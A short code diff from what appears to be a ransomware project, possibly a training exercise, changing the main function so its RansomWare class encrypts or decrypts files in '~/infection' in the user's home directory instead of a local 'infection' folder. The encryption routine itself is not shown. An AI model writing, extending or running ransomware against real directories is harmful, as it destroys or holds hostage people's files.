@@ -93,9 +93,9 @@ def main():
     args = args_manager()
     Stockholm = RansomWare(args.reverse, args.silent)
     if(args.reverse is None):
-        Stockholm.encrypt_files('infection')
+        Stockholm.encrypt_files('~/infection')
     else:
-        Stockholm.decrypt_files('infection')
+        Stockholm.decrypt_files('~/infection')
     return();
 
 
